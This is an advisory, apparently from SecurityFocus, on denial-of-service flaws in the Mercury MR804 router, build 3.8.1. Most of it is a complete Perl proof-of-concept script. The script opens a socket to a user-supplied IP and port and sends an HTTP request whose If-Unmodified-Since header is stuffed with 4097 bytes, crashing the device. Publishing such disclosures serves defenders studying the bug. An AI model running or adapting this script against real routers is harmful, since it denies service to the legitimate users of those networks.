source: http://www.securityfocus.com/bid/52106/info

Mercury MR804 router is prone to multiple denial-of-service vulnerabilities.

Remote attackers can exploit these issues to cause the device to crash, denying service to legitimate users.

Mercury MR804 running version 3.8.1 Build 101220 is vulnerable. 

#-------------------------------------------------------------
#!/usr/bin/perl -w
use Socket;
$|=1;
print '*********************************'."\n";
print '* mercurycom MR804 v8.0 DoS PoC *'."\n";
print '*  writed by demonalex@163.com  *'."\n";
print '*********************************'."\n";
$evil='A'x4097;
$test_ip=shift;                           #target ip
$test_port=shift;                         #target port
if(!defined($test_ip) || !defined($test_port)){
    die "usage : $0 target_ip target_port\n";
}
$test_payload=
"GET / HTTP/1.0\r\n".
"Accept: */*\r\n".
"Accept-Language: zh-cn\r\n".
"UA-CPU: x86\r\n".
"If-Unmodified-Since: ".$evil."\r\n".
"Accept-Encoding: gzip, deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322;".
" .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; 360SE)\r\n".
"Host: ".$test_ip."\r\n".
"Connection: Keep-Alive"."\r\n\r\n";
$test_target=inet_aton($test_ip);
$test_target=sockaddr_in($test_port, $test_target);
socket(SOCK, AF_INET, SOCK_STREAM, 6) || die "cannot create socket!\n";
connect(SOCK, $test_target) || die "cannot connect the target!\n";
send(SOCK, $test_payload, 0) || die "cannot send the payload!\n";
#recv(SOCK, $test_payload, 100, 0);
close(SOCK);
print "done!\n";
exit(1);
#------------------------------------------------------------- 